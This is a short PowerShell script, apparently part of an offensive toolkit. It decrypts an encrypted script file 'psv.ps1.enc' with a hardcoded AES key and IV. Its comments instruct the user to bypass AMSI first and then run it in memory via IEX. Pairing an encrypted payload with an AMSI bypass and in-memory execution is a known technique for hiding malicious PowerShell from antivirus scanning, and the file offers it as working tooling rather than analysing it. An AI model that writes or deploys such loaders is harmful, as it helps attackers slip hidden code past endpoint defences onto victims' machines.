# the decryption script is a bit broken. use this until we fix );
# run like the following:
# 1- bypass amsi
# 2- IEX(./harcode.ps1)
$KeyB64 = "Yr+aGc27klomol8XJy/3e7O5ejOE2R73o+XTBQU4KF8="
$IVB64  = "tB+3pqy7+ksJGFkJrawRmA=="

$Key = [Convert]::FromBase64String($KeyB64)
$IV  = [Convert]::FromBase64String($IVB64)

$InputFile  = Join-Path (Get-Location) 'psv.ps1.enc'

if (-not (Test-Path $InputFile)) {
    throw "File not found: $InputFile"
}

$CipherBytes = [System.IO.File]::ReadAllBytes($InputFile)

$AES = [System.Security.Cryptography.Aes]::Create()
$AES.Mode    = 'CBC'
$AES.Padding = 'PKCS7'
$AES.Key     = $Key
$AES.IV      = $IV

$Decryptor = $AES.CreateDecryptor()
$PlainBytes = $Decryptor.TransformFinalBlock(
    $CipherBytes, 0, $CipherBytes.Length
)

[System.Text.Encoding]::UTF8.GetString($PlainBytes)
